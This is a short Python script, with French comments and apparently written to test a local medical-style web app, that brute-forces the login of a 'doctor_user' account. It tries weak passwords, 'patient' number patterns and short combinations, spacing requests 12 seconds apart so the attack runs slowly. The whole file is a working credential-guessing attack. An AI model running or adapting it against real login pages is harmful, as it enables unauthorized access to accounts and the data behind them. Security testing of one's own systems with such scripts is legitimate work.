import requests
import time
from itertools import product

URL = "https://localhost:8000/login"
CERT_PATH = "../server/certs/cert.pem"

# Identifiants connus
username = "doctor_user"
# Génère des combinaisons simples (mots de passe faibles)
wordlist = ["tet123", "123456", "password", "pass123", "secret", "test", "test123"] + \
           [f"patient{i:03d}" for i in range(100)] + \
           [f"{a}{b}{c}" for a, b, c in product("abc123", repeat=3)]

def attempt(password):
    data = {
        "username": username,
        "password": password
    }
    try:
        r = requests.post(URL, data=data, verify=CERT_PATH, allow_redirects=False)
        if r.status_code == 302:
            print(f"✅ SUCCESS with password: {password}")
            return True
        else:
            print(f"❌ Failed: {password}")
    except Exception as e:
        print("⚠️ Error:", e)
    return False

# Attaque lente (1 requête toutes les 12 secondes)
for pwd in wordlist:
    success = attempt(pwd)
    if success:
        break
    time.sleep(12)
